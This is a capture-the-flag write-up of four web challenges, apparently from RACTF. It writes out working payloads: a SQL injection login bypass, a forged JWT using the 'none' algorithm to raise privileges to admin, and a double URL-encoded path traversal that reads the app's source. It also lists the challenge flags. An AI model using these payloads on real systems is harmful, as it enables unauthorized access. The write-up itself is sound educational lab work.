# Quarantine

![](img/challenge1.png)

There is a login panel on the website and also a sign up page, but I can't access that as it is currently closed.

![](img/sign_in.png)

So I decided to try a few simple SQL-Injections and after got a new error message:
```
Username: admin
Password: ' OR 1=1;--
```
![](img/error.png)

That means the SQL Query returns multiple users and I have to limit it to just one.
```
Username: admin
Password: ' OR 1=1 LIMIT 1;--
```

![](img/flag.png)

# Getting Admin

![](img/challenge2.png)

For this challenge i looked at the auth token and base64 decoded the parts:
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9: {"typ":"JWT","alg":"HS256"}

eyJ1c2VyIjogIkhhcnJ5IiwgInByaXZpbGVnZSI6IDF9: {"user": "Harry", "privilege": 1}

A7OHDo-b3PB5XONTRuTYq6jm2Ab8iaT353oc-VPPNMU: Random bytecode
```
After researching JWT Tokens I found an exploit, where you can set the algorithm to `none` and freely manipulate the token afterwards, as then there is no signature verification.
```
{"typ":"JWT","alg":"none"}: eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=
{"user": "Harry", "privilege": 1}: eyJ1c2VyIjogIkhhcnJ5IiwgInByaXZpbGVnZSI6IDF9

Token:
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VyIjogIkhhcnJ5IiwgInByaXZpbGVnZSI6IDF9.A7OHDo-b3PB5XONTRuTYq6jm2Ab8iaT353oc-VPPNMU
```
As I was able to authenticate with this token the exploit must have worked. 
So now I just have to find the correct "user" and "privilege" values:
```
{"user": "Admin", "privilege": 2}: eyJ1c2VyIjogIkFkbWluIiwgInByaXZpbGVnZSI6IDJ9

Token:
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VyIjogIkFkbWluIiwgInByaXZpbGVnZSI6IDJ9.A7OHDo-b3PB5XONTRuTYq6jm2Ab8iaT353oc-VPPNMU
```
With this I was then able to access `/admin` and get the flag.

`ractf{j4va5cr1pt_w3b_t0ken}`

# Hidden information

![](img/challenge3.png)

I looked at `/robots.txt` and found a hint to another URL
```
User-Agent: *
Disallow: /admin-stash
```
Then I checked `/admin-stash` and got the flag.

`ractf{1m_n0t_4_r0b0T}`

# Finding server information

![](img/challenge4.png)

As you have to find the source of the app I propably need a LFI and the most obvious target is `/watch/[Video]`

![](img/watch.png)

When I enter an invalid video name in the URL like `/watch/test` I get an `Internal Server Error`. 
This means there is some internal server logic handling it, which allows for LFI, as otherwise I would get a `Not Found` Exception.

As I can't just go to `/watch/../app.py` I needed to encode it. So after some experimenting I url-encoded the `/` twice and read out the flag in the source of the website.
```html
/watch/..%25252Fapp.py
<video controls src="data:video/mp4;base64,ractf{qu3ry5tr1ng_m4n1pul4ti0n}"></video>
```

